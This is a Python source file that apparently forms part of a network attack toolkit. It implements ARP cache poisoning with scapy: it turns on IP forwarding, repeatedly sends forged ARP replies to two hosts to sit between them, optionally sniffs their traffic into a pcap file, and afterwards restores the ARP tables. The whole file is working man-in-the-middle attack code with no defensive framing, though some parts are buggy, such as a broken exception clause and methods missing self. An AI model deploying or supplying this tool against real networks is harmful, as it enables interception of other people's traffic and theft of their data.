from scapy.all import *
import os
import threading
import time
from netifaces import *
import netifaces as ni


class ARPattack:

    loop_bool = None

    def __init__(self, ip1, mac1, ip2, mac2, frequency, packet_count):
        #ARP Poison parameters
        self.ip1 = ip1
        self.mac1 = mac1
        self.ip2 = ip2
        self.mac2 = mac2
        self.frequency = frequency
        self.packet_count = packet_count
        self.poison_thread

    def start_attack(ip1, mac1, ip2, mac2, frequency, pkt_cnt, bool_sniff):
        # Check the interface first
        list_interfaces = []
        try:
            f = open("/proc/net/if_inet6", "r")
        except IOError and err:
            return list_interfaces
        l = f.readlines()
        for i in l:
            # address, index, plen, scope, flags, ifname
            temp = i.split()
            list_interfaces.append(str(temp[5]))
        for interface in list_interfaces:
            ip_if = ni.ifaddresses(interface)[AF_INET][0]["addr"]
            # Check if the IP of the interface matches the input IP
            if ARP(pdst=ip_if+"/24") == ARP(pdst=ip1+"/24"):
                # If so, use this interface to communicate through
                conf.iface = interface
                break

        # Start the script
        conf.verb = 0
        print("> ARP: Enabling IP forwarding")
        os.system("sysctl -w net.ipv4.ip_forward=1")
        print("> ARP: IP address 1: %s" % ip1)
        print("> ARP: IP address 2: %s" % ip2)

        # ARP poisoning thread
        ARPattack.poison_thread = threading.Thread(target=ARPattack.arp_poison, args=(ip1, mac1, ip2, mac2,  frequency))
        ARPattack.poison_thread.start()

        # Sniff traffic and write to a .pcap file
        if bool_sniff:
            sniff_filter = "ip dst %s or ip dst %s " %(ip1, ip2)
            print("> ARP: Sniffing active. Starting network capture. Packet Count: %d. Filter: %s" % (int(pkt_cnt),
                                                                                                      sniff_filter))
            packets = sniff(filter=sniff_filter, iface=conf.iface, count=int(pkt_cnt))
            wrpcap(ip2 + "_capturelog.pcap", packets)

    # Restore the network by reversing the ARP poison attack
    # This will broadcast an ARP Reply with the correct MAC and IP Address
    def restore_network(ip1, mac1, ip2, mac2):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip2, hwsrc=mac1, psrc=ip1), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip1, hwsrc=mac2, psrc=ip2), count=5)
        print("> ARP: Disabling IP Forwarding")
        os.system("sysctl -w net.ipv4.ip_forward=0")
        print("> ARP: Poisoning stopped")
        return

    # Keep sending false ARP replies to prevent interruption of our attack
    def arp_poison(ip1, mac1, ip2, mac2, frequency):
        ARPattack.loop_bool = True
        print("> ARP: Starting to poison...")
        while ARPattack.loop_bool:
            send(ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1))
            send(ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2))
            time.sleep(int(frequency))
        print("> ARP: Stopping...")
        ARPattack.restore_network(ip1, mac1, ip2, mac2)

